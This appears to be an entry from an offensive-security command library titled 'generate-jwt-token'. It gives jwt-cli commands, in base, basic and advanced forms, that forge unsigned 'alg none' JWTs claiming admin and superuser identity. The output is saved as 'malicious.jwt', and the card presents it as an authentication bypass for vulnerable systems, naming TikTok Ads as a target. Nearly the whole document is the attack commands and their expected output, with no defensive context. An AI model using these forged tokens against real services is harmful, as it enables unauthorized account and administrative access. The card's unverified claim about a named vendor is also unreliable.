---
data: >-
  jwt -alg none -i attacker@example.com -s '' -header
  '{"typ":"JWT","alg":"none"}' -payload
  '{"sub":"admin","iat":1234567890,"exp":1234567899}' > malicious.jwt
tags:
  - jwt
  - bypass
type: command
executor: bash
platforms:
  - Linux
  - macOS
id: b57b2718-4d55-49bd-b578-5e88293e4513
created_at: '2025-12-14T17:30:58.263Z'
updated_at: '2025-12-14T17:30:58.263Z'
verified: false
validated: true
submitted: true
---
# generate-jwt-token

## Command

```bash
jwt -alg none -i attacker@example.com -s '' -header '{"typ":"JWT","alg":"none"}' -payload '{"sub":"admin","iat":1234567890,"exp":1234567899}' > malicious.jwt
```

## Description

This command uses the jwt-cli tool to generate an unsigned JWT token exploiting the 'none' algorithm, suitable for authentication bypass in vulnerable systems like TikTok Ads.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-alg none` | Sets algorithm to none for bypass | Yes |
| `-i` | Issuer claim | Yes |
| `-s ''` | Empty secret (no signing) | Yes |
| `-header` | Custom header JSON | Yes |
| `-payload` | Claims like sub, iat, exp | Yes |

## Examples

### Basic Usage

```bash
jwt -alg none -payload '{"sub":"admin"}' > token.jwt
```

### Advanced Usage

```bash
jwt -alg none -i 'attacker' -payload '{"sub":"admin","roles":["superuser"] }' > advanced.jwt
```

## Expected Output

A file containing the base64-encoded JWT string, e.g., eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.

## Related

- [[Related Procedure|procedures/JWT-Authentication-Bypass]]
